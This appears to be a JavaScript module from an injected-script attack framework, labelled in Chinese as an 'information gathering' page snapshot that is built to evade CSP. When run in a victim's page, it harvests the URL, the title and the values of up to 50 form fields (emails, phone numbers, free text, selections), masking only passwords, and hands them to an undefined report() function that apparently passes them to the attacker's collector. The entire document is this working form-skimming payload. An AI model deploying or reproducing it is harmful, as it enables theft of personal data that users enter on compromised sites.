// MODULE = {"desc": "页面快照:title/URL/表单输入采集(纯 DOM,不引外链,兼容 CSP)", "category": "信息收集", "params": []}
(function () {
  function snap() {
    var d = { type: "screen", url: location.href, title: document.title || "", inputs: [] };
    var inputs = document.querySelectorAll(
      "input[type=text],input[type=password],input[type=email],input[type=tel],textarea,select");
    for (var i = 0; i < inputs.length && d.inputs.length < 50; i++) {
      var el = inputs[i];
      var v = el.value || "";
      if (el.type === "password") { v = "****"; }
      d.inputs.push((el.name || el.id || ("f" + i)) + "=" + v);
    }
    report(d);
  }
  snap();
})();
